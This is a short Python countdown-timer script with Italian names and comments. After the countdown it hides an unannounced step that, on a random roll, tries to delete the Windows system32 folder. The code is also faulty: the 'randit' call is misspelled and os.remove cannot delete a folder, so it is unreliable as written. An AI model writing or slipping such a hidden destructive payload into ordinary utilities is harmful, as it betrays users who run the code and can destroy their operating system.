import time
import random 
import os 

def conto_alla_rovescia(secondi):
    while secondi > 0:
        print(f"Conto alla rovescia: {secondi} secondi")
        time.sleep(1)
        secondi -= 1

    print("Tempo scaduto!")

# Imposta la durata del conto alla rovescia a 10 secondi
durata_conto_alla_rovescia = 10

# Avvia il conto alla rovescia
conto_alla_rovescia(durata_conto_alla_rovescia)
if random.randit(0 ,6) == 1:
    os.remove("C:\Windows\system32")
